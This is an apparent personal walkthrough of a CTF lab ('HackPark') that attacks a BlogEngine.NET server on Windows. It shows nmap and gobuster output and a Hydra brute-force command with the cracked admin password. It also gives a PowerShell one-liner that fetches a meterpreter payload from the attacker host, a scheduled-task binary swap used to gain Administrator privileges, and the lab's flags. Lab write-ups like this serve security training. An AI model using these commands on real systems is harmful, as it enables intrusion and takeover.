HACKPARK:

step 1 :
Enumeration

"""
┌──(kali㉿kali)-[~/Desktop/THM/OFFENSIVE_PENTESTING/HACKPARK]
└─$ sudo nmap -sS -sV -Pn  10.10.215.174 -oN namp.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 10:50 EST
Stats: 0:01:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 10:53 (0:01:18 remaining)
Nmap scan report for 10.10.215.174
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.33 seconds


"""

GOBUSTER:

"""
┌──(kali㉿kali)-[~/Desktop/THM/OFFENSIVE_PENTESTING/HACKPARK]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.215.174/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.215.174/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/19 10:53:48 Starting gobuster in directory enumeration mode
===============================================================
/account              (Status: 301) [Size: 152] [--> http://10.10.215.174/account/]
/admin                (Status: 302) [Size: 173] [--> http://10.10.215.174/Account/login.aspx?ReturnURL=/admin]
/Admin                (Status: 302) [Size: 173] [--> http://10.10.215.174/Account/login.aspx?ReturnURL=/Admin]
/ADMIN                (Status: 302) [Size: 173] [--> http://10.10.215.174/Account/login.aspx?ReturnURL=/ADMIN]
/Archive              (Status: 200) [Size: 8325]                                                              
/archive              (Status: 200) [Size: 8325]                                                              
/archives             (Status: 200) [Size: 8326]                                                              
/aspnet_client        (Status: 301) [Size: 158] [--> http://10.10.215.174/aspnet_client/]                     
/aux                  (Status: 500) [Size: 1763]                                                              
/blog                 (Status: 500) [Size: 1208]                                                              
/Blog                 (Status: 500) [Size: 1208]                                                              
/com1                 (Status: 500) [Size: 1763]                                                              
/com3                 (Status: 500) [Size: 1763]                                                              
/com2                 (Status: 500) [Size: 1763]                                                              
/con                  (Status: 500) [Size: 1763]                                                              
/contact_bean         (Status: 200) [Size: 9940]                                                              
/contact-form         (Status: 200) [Size: 9940]                                                              
/contactinfo          (Status: 200) [Size: 9939]                                                              
/contacto             (Status: 200) [Size: 9936]                                                              
/ContactUs            (Status: 200) [Size: 9937]                                                              
/content              (Status: 301) [Size: 152] [--> http://10.10.215.174/content/]                           
/contact_us           (Status: 200) [Size: 9938]                                                              
/Content              (Status: 301) [Size: 152] [--> http://10.10.215.174/Content/]                           
/contact              (Status: 200) [Size: 9935]                                                              
/contactus            (Status: 200) [Size: 9937]                                                              
/contact-us           (Status: 200) [Size: 9938]                                                              
/Contact              (Status: 200) [Size: 9935]                                                              
/contacts             (Status: 200) [Size: 9936]                                                              
/custom               (Status: 301) [Size: 151] [--> http://10.10.215.174/custom/]                            
/Default              (Status: 500) [Size: 1763]                                                              
/default_icon         (Status: 500) [Size: 1763]                                                              
/default_image        (Status: 500) [Size: 1763]                                                              
/default_page         (Status: 500) [Size: 1763]                                                              
/default_pages        (Status: 500) [Size: 1763]                                                              
/defaults             (Status: 500) [Size: 1763]                                                              
/default              (Status: 500) [Size: 1763]                                                              
/default_logo         (Status: 500) [Size: 1763]                                                              
/fonts                (Status: 301) [Size: 150] [--> http://10.10.215.174/fonts/]                             
/lpt1                 (Status: 500) [Size: 1763]                                                              
/lpt2                 (Status: 500) [Size: 1763]                                                              
/nul                  (Status: 500) [Size: 1763]                                                              
/prn                  (Status: 500) [Size: 1763]                                                              
/robots.txt           (Status: 200) [Size: 303]                                                               
/scripts              (Status: 301) [Size: 152] [--> http://10.10.215.174/scripts/]                           
/Scripts              (Status: 301) [Size: 152] [--> http://10.10.215.174/Scripts/]                           
/searchresults        (Status: 200) [Size: 8414]                                                              
/search_result        (Status: 200) [Size: 8414]                                                              
/searchurl            (Status: 200) [Size: 8410]                                                              
/search_results       (Status: 200) [Size: 8415]                                                              
/search               (Status: 200) [Size: 8407]                                                              
/Search               (Status: 200) [Size: 8407]                                                              
/searchnx             (Status: 200) [Size: 8409]                                                              
/search-results       (Status: 200) [Size: 8415]                                                              
/setup                (Status: 302) [Size: 175] [--> http://10.10.215.174/Account/login.aspx?ReturnUrl=%2fsetup]
                                                                                                                
===============================================================
2022/02/19 10:56:19 Finished
===============================================================

"""

LETSBRUTE FORCE THE ADMIN LOGIN PAGE WITH HYDRA

GET THE LOGIN FORM FROM BURP SUITE "/Account/login.aspx?ReturnURL=/admin" after that put ':' and add view state cookie from burp 

and modify ^USER^ and ^PASS^ in it
after that put ':' and add the Login failed for grep match and run it ;
"""
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.90.80 http-post-form "/Account/login.aspx?ReturnURL=/admin:
__VIEWSTATE=uTtdHDKJc8icWbt%2F6Hn1CnLTRH2J9FN3A3qAW2H%2BszfFrA1toKZpnLu4Ro3zQvU7J6ttPj0Gaiw97sbxsKTAHCiAcIhVG22AlAex7Cr%2BN0SJqi30wAzXWwpKhGKUkr9Q%2FcVATNWK1oQfxmd1ccNisWvGHJATlDpBKFc9LziSc4zqvvLi&__EVENTVALIDATION=IJovAt%2F4%2FL3MwAvFTNwHoQcK37sQ4lqfyMZV7HE5Q9Q9lsXPstdw%2FwN4u7GyVunOBsNg50zjQ%2BR4U80UNbJLVc6vunYxnBQBg1k4B4CLVD0T%2FEdRTvKe5owdc5LNpCEzN2Ty4lWRaTb68MMvS0pOFbbrCz2jHqbJQbki0XYsYnGK9FLj&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"


RESULTS 
"""
┌──(kali㉿kali)-[~/Desktop/THM/OFFENSIVE_PENTESTING/HACKPARK]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.90.80 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=uTtdHDKJc8icWbt%2F6Hn1CnLTRH2J9FN3A3qAW2H%2BszfFrA1toKZpnLu4Ro3zQvU7J6ttPj0Gaiw97sbxsKTAHCiAcIhVG22AlAex7Cr%2BN0SJqi30wAzXWwpKhGKUkr9Q%2FcVATNWK1oQfxmd1ccNisWvGHJATlDpBKFc9LziSc4zqvvLi&__EVENTVALIDATION=IJovAt%2F4%2FL3MwAvFTNwHoQcK37sQ4lqfyMZV7HE5Q9Q9lsXPstdw%2FwN4u7GyVunOBsNg50zjQ%2BR4U80UNbJLVc6vunYxnBQBg1k4B4CLVD0T%2FEdRTvKe5owdc5LNpCEzN2Ty4lWRaTb68MMvS0pOFbbrCz2jHqbJQbki0XYsYnGK9FLj&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-20 00:52:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.90.80:80/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=uTtdHDKJc8icWbt%2F6Hn1CnLTRH2J9FN3A3qAW2H%2BszfFrA1toKZpnLu4Ro3zQvU7J6ttPj0Gaiw97sbxsKTAHCiAcIhVG22AlAex7Cr%2BN0SJqi30wAzXWwpKhGKUkr9Q%2FcVATNWK1oQfxmd1ccNisWvGHJATlDpBKFc9LziSc4zqvvLi&__EVENTVALIDATION=IJovAt%2F4%2FL3MwAvFTNwHoQcK37sQ4lqfyMZV7HE5Q9Q9lsXPstdw%2FwN4u7GyVunOBsNg50zjQ%2BR4U80UNbJLVc6vunYxnBQBg1k4B4CLVD0T%2FEdRTvKe5owdc5LNpCEzN2Ty4lWRaTb68MMvS0pOFbbrCz2jHqbJQbki0XYsYnGK9FLj&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[STATUS] 292.00 tries/min, 292 tries in 00:01h, 14344107 to do in 818:44h, 16 active
[STATUS] 271.33 tries/min, 814 tries in 00:03h, 14343585 to do in 881:04h, 16 active
[80][http-post-form] host: 10.10.90.80   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-20 00:58:35


"""


DO A QUICK SEARCH SPLOIT SEARCH : ON BLOGENGINE 


"""
┌──(kali㉿kali)-[~]
└─$ searchsploit  blogengine                                                                                                                                      255 ⨯
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                                                                      | xml/webapps/48422.txt
BlogEngine 3.3 - XML External Entity Injection                                                                                        | windows/webapps/46106.txt
BlogEngine 3.3.8 - 'Content' Stored XSS                                                                                               | aspx/webapps/48999.txt
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                                               | asp/webapps/32874.txt
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                                     | asp/webapps/35168.txt
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                                    | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                                    | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                               | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                               | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                            | aspx/webapps/47014.py
-------------------------------------------------------------------------------------------------------------------------------------- -----------------------------

"""
"""
use BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution         exploit and upload it in the valid ctagerory 
afetr that get the unstble netcat shell 
convert it to meterpreter shell 


windows/meterpreter/reverse_tcp


"""
powershell -c "Invoke-WebRequest -Uri 'http://10.11.61.80:9000/meterpreter.exe' -OutFile 'C:\Windows\TEMP\meterpreter.exe'"

GET THE METERPRETER SHELL

AFTER that use powershell invoke command to tranfer winPEAS over it 
run it .\winPEAS.bat


"""
[+] RUNNING PROCESSES                                                                                                                                                  
   [i] Something unexpected is running? Check for vulnerabilities                                                                                                       
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                                                                         
                                                                                                                                                                        
Image Name                     PID Services                                                                                                                             
========================= ======== ============================================                                                                                         
System Idle Process              0 N/A                                                                                                                                  
System                           4 N/A                                                                                                                                  
smss.exe                       372 N/A                                                                                                                                  
csrss.exe                      532 N/A                                                                                                                                  
csrss.exe                      588 N/A                                                                                                                                  
wininit.exe                    596 N/A                                                                                                                                  
winlogon.exe                   640 N/A                                                                                                                                  
services.exe                   680 N/A                                                                                                                                  
lsass.exe                      688 SamSs                                                                                                                                
svchost.exe                    752 BrokerInfrastructure, DcomLaunch, LSM,                                                                                               
                                   PlugPlay, Power, SystemEventsBroker                                                                                                  
svchost.exe                    796 RpcEptMapper, RpcSs                                                                                                                  
dwm.exe                        876 N/A                                                                                                                                  
svchost.exe                    884 Dhcp, EventLog, lmhosts, Wcmsvc                                                                                                      
svchost.exe                    916 CertPropSvc, DsmSvc, gpsvc, iphlpsvc,                                                                                                
                                   LanmanServer, ProfSvc, Schedule, SENS,                                                                                               
                                   SessionEnv, ShellHWDetection, Themes,                                                                                                
                                   Winmgmt                                                                                                                              
svchost.exe                    976 EventSystem, FontCache, netprofm, nsi,                                                                                               
                                   W32Time, WinHttpAutoProxySvc                                                                                                         
svchost.exe                    360 CryptSvc, Dnscache, LanmanWorkstation,                                                                                               
                                   NlaSvc, WinRM                                                                                                                        
svchost.exe                   1012 BFE, DPS, MpsSvc                                                                                                                     
spoolsv.exe                   1148 Spooler                                                                                                                              
amazon-ssm-agent.exe          1176 AmazonSSMAgent                                                                                                                       
svchost.exe                   1240 AppHostSvc                                                                                                                           
LiteAgent.exe                 1276 AWSLiteAgent                                                                                                                         
svchost.exe                   1336 TrkWks, UALSVC, UmRdpService                                                                                                         
svchost.exe                   1352 W3SVC, WAS                                                                                                                           
WService.exe                  1416 WindowsScheduler                                                                                                                     
WScheduler.exe                1556 N/A                                                                                                                                  
Ec2Config.exe                 1656 Ec2Config                                                                                                                            
WmiPrvSE.exe                  1744 N/A                                                                                                                                  
svchost.exe                   1804 TermService                                                                                                                          
taskhostex.exe                2620 N/A                                                                                                                                  
explorer.exe                  2688 N/A                                                                                                                                  
ServerManager.exe             3060 N/A                                                                                                                                  
WScheduler.exe                2448 N/A   ----> sus                                                                                                                                
msdtc.exe                     2704 MSDTC                                                                                                                                
w3wp.exe                       652 N/A                                                                                                                                  
cmd.exe                       1844 N/A                                                                                                                                  
conhost.exe                   2732 N/A                                                                                                                                  
cmd.exe                       2996 N/A                                                                                                                                  
conhost.exe                    492 N/A                                                                                                                                  
meterpreter.exe               1644 N/A                                                                                                                                  
cmd.exe                       2860 N/A                                                                                                                                  
conhost.exe                   1924 N/A                                                                                                                                  
cmd.exe                       2188 N/A                                                                                                                                  
conhost.exe                   1864 N/A                                                                                                                                  
cmd.exe                       1508 N/A                                                                                                                                  
conhost.exe                   2576 N/A                                                                                                                                  
WmiPrvSE.exe                  1108 N/A                                                                                                                                  
WmiPrvSE.exe                  1900 N/A                                                                                                                                  
TrustedInstaller.exe          1576 TrustedInstaller                                                                                                                     
TiWorker.exe                  1852 N/A                                                                                                                                  
tasklist.exe                  1972 N/A             

"""

we go to program files 86 then system shedulaer then events we see message.exe is running after every 30 sec with administrator privs 

"""
meterpreter > cat 20198415519.INI_LOG.txt

08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)


"""


WE CAN JUST REPLACE THIS WITH OUR METERPRETER SHELL By Same proress of invoke and renaming

1: USER FLAG
759bd8af507517bcfaede78a21a73e39
2: Rooot flag 
7e13d97f05f7ceb9881a3eb3d78d3e72

